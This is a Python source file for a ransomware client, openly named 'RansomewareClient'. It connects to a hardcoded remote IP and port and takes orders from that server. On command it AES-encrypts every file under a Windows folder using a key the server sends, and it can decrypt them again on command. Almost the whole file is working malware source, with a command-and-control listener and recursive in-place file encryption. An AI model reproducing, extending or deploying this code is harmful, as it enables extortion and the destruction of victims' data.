import base64
from Crypto.Cipher import AES
from Crypto import Random
import os
import socket
import threading

client_socket=""

def create_client():
    """
    Create a TCP client socket and connect to the server.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("149.106.246.173", 7766))
    return s

def connect_to_server():
    """
    Connect the client to the server and update UI accordingly.
    """
    global client_socket
    try:
        client_socket = create_client()
        print("✅ Connected to server")
    
    except Exception as e:
        print(f"❌ Connection failed: {e}")



def pad(data: bytes, block_size: int = 16) -> bytes:
    pad_len = block_size - (len(data) % block_size)
    if pad_len == 0: pad_len = block_size
    return data + bytes([pad_len]) * pad_len

def unpad(padded: bytes, block_size: int = 16) -> bytes:
    pad_len = padded[-1]
    if pad_len < 1 or pad_len > block_size:
        raise ValueError("bad padding")
    if padded[-pad_len:] != bytes([pad_len]) * pad_len:
        raise ValueError("bad padding")
    return padded[:-pad_len]

class AESCipher:
    def __init__(self, secret_key):
        self.key = secret_key

    def encrypt(self, plaintext):
        plaintext = pad(plaintext, AES.block_size) # Add bytes to the text in order to fit to blocksize
        iv = Random.new().read(AES.block_size) # Create more random bytes to merge with the plaintext
        encryptor = AES.new( self.key, AES.MODE_CBC, iv ) # Create AES key
        encrypted_text = encryptor.encrypt( plaintext )  # Encrypt text
        return base64.b64encode( iv +  encrypted_text)

    def decrypt(self, cipher):
        encrypted_text = base64.b64decode(cipher) # Decode base64 from the cipher
        iv = encrypted_text[:AES.block_size] # Read IV
        encrypted_text = encrypted_text[AES.block_size:] # Read plaintext only (ignore the IV)
        encryptor = AES.new(self.key, AES.MODE_CBC, iv ) # Create AES Key
        plaintext = encryptor.decrypt(encrypted_text) # Decode the cipher
        plaintext = unpad(plaintext, AES.block_size)
        return plaintext


class RansomewareClient():
    def __init__(self, key):
        self.encryptor = AESCipher(key)
        

    def encrypt_file(self, file_path):
        plaintext = self.read_file(file_path)
        encrypted_text = self.encryptor.encrypt(plaintext)
        self.write_file(file_path, encrypted_text)


    def decrypt_file(self, file_path):
        encrypted_text = self.read_file(file_path)
        plaintext = self.encryptor.decrypt(encrypted_text)
        self.write_file(file_path, plaintext)

    def read_file(self, path):
            with open(path, "rb") as file:
                plaintext = file.read()
                return plaintext

    def write_file(self, path, content):
            with open(path, "wb") as encrypted_file:
                encrypted_file.write(content)
    
    def encrypt_folder(self,folder_path):
        for root, dirs, files in os.walk(folder_path):
            for filename in files:
                full_path = os.path.join(root, filename)
                self.encrypt_file(full_path)
        print("encryption is done")

    
    def decrypt_folder(self,folder_path):
        for root, dirs, files in os.walk(folder_path):
            for filename in files:
                full_path = os.path.join(root, filename)
                self.decrypt_file(full_path)    
        
        print("decryption is done")

    def change_key(self, new_key_b64_str):
        key_bytes = base64.b64decode(new_key_b64_str)
        self.encryptor = AESCipher(key_bytes)
        print(f"[+] Encryption key changed to: {new_key_b64_str}")

        
def listener_thread(ransomware):
    """
    Listen for control commands (keyboard, mouse movement, mouse click) from the server.
    """
    buffer = b""
    global client_socket
    
    buffer = b""
    while b"<<END_OF_message>>" not in buffer:
        try:
            data = client_socket.recv(1024)
            if not data:
                print("❌ Disconnected from server.")
                break

            buffer += data

            if b"<<END_OF_message>>" in buffer:
                # Handle key press
                if b"<<encrypt_file>>" in buffer:
                    msg = buffer.decode()
                    full_msg, msg = msg.split("<<END_OF_message>>", 1)
                    #print(f"📥 Received full message: {full_msg[len('<<key_Pressed>>'):]}")
                    ransomware.change_key(full_msg[len('<<encrypt_file>>'):])
                    ransomware.encrypt_folder(r"C:\Users\User\Desktop\New folder (2)")

                # Handle mouse movement
                if b"<<decrypt_file>>" in buffer:
                    msg = buffer.decode()
                    full_msg, msg = msg.split("<<END_OF_message>>", 1)
                    #print(f"📥 Received full message: {full_msg[len('<<sending_cords>>'):]}")
                    ransomware.change_key((full_msg[len('<<decrypt_file>>'):]))
                    ransomware.decrypt_folder(r"C:\Users\User\Desktop\New folder (2)")

        

        except Exception as e:
            print(f"❌ Listener error: {e}")


connect_to_server()
connect_to_server
ransomware = RansomewareClient(key="summer8200sum123")
#while True:
listener_thread(ransomware)

